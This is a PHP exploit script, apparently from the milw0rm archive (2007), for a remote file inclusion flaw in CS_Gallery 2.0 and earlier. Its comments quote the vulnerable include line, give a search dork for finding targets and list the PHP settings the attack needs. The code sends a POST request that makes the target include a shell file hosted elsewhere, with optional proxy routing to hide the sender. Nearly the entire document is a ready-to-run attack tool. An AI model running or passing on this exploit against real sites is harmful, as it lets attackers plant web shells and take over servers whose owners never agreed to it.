<?php

//File Inclusion Exploit for CS_Gallery <= 2.0
//Found and Exploit Coded by burncycle - burncycle[(at)]robert-beran[(dot)]de
//|
//Vendor: http://www.cschneider.de/
//Dork: www.cschneider.info
//|
//Bug in "index.php":
//..
//$codefile=$_POST['album'].'/code.php';
//include $codefile;
//..
//|
//Usage: php exploit.php [pathtoscript] [pathtoshell] ([proxy:port])
//Example: php exploit.php http://pathtoscript.com/cs_gallery/ http://pathtoshell.com/shell.txt? (localhost:8118)
//|
//Your Box Needs the cURL extension of PHP
//The exploit works only with allow_url_fopen = On and allow_url_include = On PHP settings on the target box
//|
//Edited 20.05.2007 by ensai (the same person as burncycle ;))
//Added proxy support, working conditions supplemented and easier file inclusion statement

//Nur ausnahme Fehler anzeigen
error_reporting(1);

echo "Usage: php ".$_SERVER["argv"][0]." [pathtoscript] [pathtoshell] ([proxy:port])\r\n\r\n";
echo "Example: php ".$_SERVER["argv"][0]." http://pathtoscript.com/cs_gallery/ http://pathtoshell.com/shell.txt? (localhost:8118)\r\n\r\n";

//Schauen ob alles angegeben wurde
if(!empty($_SERVER["argv"][1]) && !empty($_SERVER["argv"][2]))
{

  $pathtoscript = $_SERVER["argv"][1];
  $pathtoshell = $_SERVER["argv"][2];

  //erzeuge ein neues cURL Handle
  $ch = curl_init();
  
  //proxy setzen
  if (!empty($_SERVER['argv'][3]))
  {
    curl_setopt($ch, CURLOPT_PROXY, $_SERVER['argv'][3]);
  }

  //setzte die URL und andere Optionen
  curl_setopt($ch, CURLOPT_URL, $pathtoscript."index.php?todo=securealbum");
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "album=".$pathtoshell);

  //f?hre die Aktion aus
  curl_exec($ch);

  //schlie?e das Handle und gebe Systemresourcen frei
  curl_close($ch);

}

?>

# milw0rm.com [2007-02-24]
